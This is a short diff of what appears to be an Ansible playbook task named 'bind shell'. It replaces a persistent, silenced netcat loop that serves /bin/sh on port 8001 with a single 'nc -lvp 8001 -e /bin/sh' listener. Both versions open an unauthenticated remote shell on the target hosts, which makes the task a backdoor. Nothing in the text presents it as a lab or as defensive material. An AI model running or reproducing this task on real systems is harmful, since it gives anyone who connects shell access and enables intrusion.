@@ -6,4 +6,4 @@
   tasks:
     - name: bind shell
       register: uptimeoutput
-      command: "while :; do nc -lvp 8001 -e /bin/sh; sleep 120; done &>/dev/null &"
+      command: "nc -lvp 8001 -e /bin/sh"
